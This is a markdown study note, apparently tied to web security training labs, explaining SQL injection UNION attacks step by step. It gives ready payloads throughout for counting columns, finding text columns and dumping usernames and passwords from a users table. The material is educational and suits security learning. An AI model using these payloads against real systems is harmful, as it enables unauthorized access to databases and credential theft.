# SQL injection UNION attacks

When a query's results are **reflected in the response**, the `UNION` keyword lets you bolt an extra `SELECT` onto the original query and read data from **other tables**. This is a **UNION attack**.

> Part of the [SQL Injection](README.md) path. The core in-band exfiltration technique. See [Retrieving multiple values in a single column](Retrieving-multiple-values-in-a-single-column.md) for the one-column variant, and [Examining the database](Examining-the-database.md) for finding table/column names to target.

---

**Table of contents**

- [In plain English](#in-plain-english)
- [What UNION does and its two rules](#what-union-does-and-its-two-rules)
- [Step 1 — determine the number of columns](#step-1--determine-the-number-of-columns)
- [Database-specific syntax](#database-specific-syntax)
- [Step 2 — find a column with a useful data type](#step-2--find-a-column-with-a-useful-data-type)
- [Step 3 — retrieve interesting data](#step-3--retrieve-interesting-data)
- [Labs](#labs)

---

## In plain English

| Topic | The idea | Takeaway |
| --- | --- | --- |
| **UNION attack** | Append your own `SELECT` to the app's query so its output rides back in the response | If the page shows query results, `UNION SELECT` lets you read *any* table. Two setup steps first: how many columns, and which of them hold text. |
| **Column count** | `UNION` requires both queries to return the **same number of columns** | Count them with `ORDER BY n` (increment until error) or `UNION SELECT NULL,NULL,...` (add NULLs until no error). |
| **Useful column** | The data you want is usually a **string** | Probe each column with `'a'` to find one that accepts text; that's where your stolen data appears. |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> a lookup sheet, not something to memorise. Hold the three-step shape (count columns → find a text column → retrieve data); come back here for the exact payloads.
</div>

---

## What UNION does and its two rules

`UNION` runs one or more extra `SELECT` queries and **appends** their rows to the original result set:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

That returns one result set of two columns, mixing values from `table1` and `table2`.

For a UNION to work, **two requirements** must hold:

1. Each query returns the **same number of columns**.
2. The **data types** in each position are **compatible** between the queries.

So before exfiltrating anything you need to learn: **how many columns** the original query returns, and **which of them** can hold the (usually string) data you're after.

---

## Step 1 — determine the number of columns

Two reliable methods.

**Method A — `ORDER BY` incrementing:**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Columns can be referenced by **index** in `ORDER BY`, so you don't need names. When the index exceeds the real column count, the DB errors:

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

**Method B — `UNION SELECT NULL`:**

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Wrong count → error:

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

`NULL` is used because it's **convertible to every common data type**, maximising the chance the payload succeeds once the count is right. A correct count returns an extra all-`NULL` row.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>You don't always see the DB error.</strong> The app may show the raw error, a generic error, or just no results. Any <em>detectable difference</em> between "right count" and "wrong count" is enough to infer the number. If both methods look identical for every count, the response is too flat and the method fails.
</div>

---

## Database-specific syntax

| Concern | Rule |
| --- | --- |
| **Oracle** | Every `SELECT` needs a `FROM` and a valid table — use the built-in `dual`: `' UNION SELECT NULL FROM DUAL--` |
| **MySQL comments** | `--` must be followed by a **space**; or use `#` |
| **Commenting out the rest** | `--` (and `#` on MySQL) truncates the original query after your injection so leftover syntax doesn't break it |

For full per-database syntax, see [SQL injection cheat sheet](SQL-injection-cheat-sheet.md).

---

## Step 2 — find a column with a useful data type

The data you want is normally a **string**, so you need a column whose type is (or is compatible with) string. Once you know the column count, drop a test string `'a'` into each position in turn:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If a column can't hold a string, you get a conversion error:

```
Conversion failed when converting the varchar value 'a' to data type int.
```

If instead the response comes back cleanly **with your `'a'` visible in it**, that column is a good landing spot for retrieved data.

---

## Step 3 — retrieve interesting data

With the column count and a string-capable column known, pull the real data. Suppose the query returns two string columns, there's a `users` table with `username` and `password`:

```sql
' UNION SELECT username, password FROM users--
```

You need the **table and column names** to do this. If you don't know them, enumerate the schema first — see [Examining the database](Examining-the-database.md). If only **one** column is usable, concatenate — see [Retrieving multiple values in a single column](Retrieving-multiple-values-in-a-single-column.md).

---

## Labs

> All **PRACTITIONER**.

| Lab | Focus | Status |
| --- | --- | --- |
| Determining the number of columns returned by the query | `ORDER BY` / `UNION SELECT NULL` counting | Solved |
| Finding a column containing text | Probing each column with `'a'` | Solved |
| Retrieving data from other tables | `' UNION SELECT username, password FROM users--` | Solved |

**General approach:**

1. Confirm injection and count columns (`ORDER BY n` or `UNION SELECT NULL,...`).
2. Find which column(s) render text by substituting `'a'` for a `NULL`.
3. Replace the `NULL`s/`'a'` with the real columns (`username`, `password`) and target table, comment out the rest, and read the values from the response.

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Order of operations matters.</strong> Column count first, then text column, then data. Skipping straight to <code>UNION SELECT username,password</code> without matching the column count/types just throws an error and tells the app you're probing.
</div>
